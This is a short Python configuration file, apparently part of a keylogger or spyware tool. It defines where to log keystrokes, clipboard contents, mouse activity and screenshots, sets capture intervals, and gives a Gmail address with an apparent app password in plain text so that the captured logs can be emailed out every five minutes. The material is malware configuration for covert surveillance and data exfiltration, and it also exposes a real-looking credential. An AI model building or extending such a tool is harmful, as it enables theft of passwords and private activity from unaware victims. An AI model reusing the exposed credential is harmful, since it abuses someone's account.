import os
import getpass

USER = getpass.getuser()
BASE_DIR = os.path.join("logs", USER)

EMAIL_ADDRESS = "beheraprabin181@gmail.com"
EMAIL_PASSWORD = "yzsz rxgt bexu qugx"
RECEIVER_EMAIL = "beheraprabin181@gmail.com"

EMAIL_INTERVAL = 300  # in seconds
SCREENSHOT_INTERVAL = 60  # in seconds
CLIPBOARD_INTERVAL = 5  # in seconds

# Log paths
KEYSTROKE_LOG = os.path.join(BASE_DIR, "keystrokes.txt")
CLIPBOARD_LOG = os.path.join(BASE_DIR, "clipboard.txt")
MOUSE_LOG = os.path.join(BASE_DIR, "mouse.txt")
SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshots")

# Ensure folders exist
os.makedirs(SCREENSHOT_DIR, exist_ok=True)
